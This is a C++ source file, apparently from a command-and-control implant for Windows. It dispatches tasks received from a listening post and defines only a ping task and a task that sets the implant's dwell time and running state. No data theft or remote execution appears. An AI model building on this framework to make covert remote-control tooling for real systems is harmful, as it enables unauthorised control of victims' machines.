#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#endif

#include "tasks.h"

#include <string>
#include <array>
#include <sstream>
#include <fstream>
#include <cstdlib>

#include <boost/uuid/uuid_io.hpp>
#include <boost/property_tree/ptree.hpp>

#include <Windows.h>
#include <tlhelp32.h>


// Function to parse the tasks from the property tree returned by the listening post
// Execute each task according to the key specified (e.g. Got task_type of "ping"? Run the PingTask)
[[nodiscard]] Task parseTaskFrom(const boost::property_tree::ptree& taskTree,
    std::function<void(const Configuration&)> setter) {
    // Get the task type and identifier, declare our variables
    const auto taskType = taskTree.get_child("task_type").get_value<std::string>();
    const auto idString = taskTree.get_child("task_id").get_value<std::string>();
    std::stringstream idStringStream{ idString };
    boost::uuids::uuid id{};
    idStringStream >> id;

    // Conditionals to determine which task should be executed based on key provided
    // REMEMBER: Any new tasks must be added to the conditional check, along with arg values
    // ===========================================================================================
    if (taskType == PingTask::key) {
        return PingTask{
            id
        };
    }
    if (taskType == ConfigureTask::key) {
        return ConfigureTask{
            id,
            taskTree.get_child("dwell").get_value<double>(),
            taskTree.get_child("running").get_value<bool>(),
            std::move(setter)
        };
    }

    // ===========================================================================================

    // No conditionals matched, so an undefined task type must have been provided and we error out
    std::string errorMsg{ "Illegal task type encountered: " };
    errorMsg.append(taskType);
    throw std::logic_error{ errorMsg };
}

// Tasks
// ===========================================================================================

// PingTask
// -------------------------------------------------------------------------------------------
PingTask::PingTask(const boost::uuids::uuid& id)
    : id{ id } {}

Result PingTask::run() const {
    const auto pingResult = "PONG!";
    return Result{ id, pingResult, true };
}

// ConfigureTask
// -------------------------------------------------------------------------------------------
// Instantiate the implant configuration
Configuration::Configuration(const double meanDwell, const bool isRunning)
    : meanDwell(meanDwell), isRunning(isRunning) {}

ConfigureTask::ConfigureTask(const boost::uuids::uuid& id,
    double meanDwell,
    bool isRunning,
    std::function<void(const Configuration&)> setter)
    : id{ id },
    meanDwell{ meanDwell },
    isRunning{ isRunning },
    setter{ std::move(setter) } {}

Result ConfigureTask::run() const {
    // Call setter to set the implant configuration, mean dwell time and running status
    setter(Configuration{ meanDwell, isRunning });
    return Result{ id, "Configuration successful!", true };
}

// ===========================================================================================
